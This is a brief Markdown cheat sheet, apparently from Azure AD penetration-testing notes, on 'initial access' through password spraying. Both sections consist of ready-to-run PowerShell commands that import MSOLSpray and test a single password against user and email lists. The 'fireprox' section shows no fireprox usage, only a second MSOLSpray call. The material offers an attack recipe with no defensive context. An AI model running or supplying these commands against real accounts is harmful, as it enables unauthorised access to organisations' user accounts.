# Initial Access

- [Password Spray](#password-spray)

## Password Spray

using MSOLSpray (https://github.com/dafthack/MSOLSpray) 
```
Import-Module MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd
```

using fireprox (https://github.com/ustayready/fireprox)
```
. C:\AzAD\Tools\MSOLSpray\MSOLSPray.ps1
Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password V3ryH4rdt0Cr4ckN0OneCanGu3ssP@ssw0rd -Verbose 
```

[Back to the top](#initial-access)